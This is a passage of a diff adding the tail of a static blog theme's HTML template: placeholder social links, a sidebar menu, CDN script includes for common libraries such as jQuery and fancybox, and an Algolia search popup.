+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    </body>
+    </html>
+
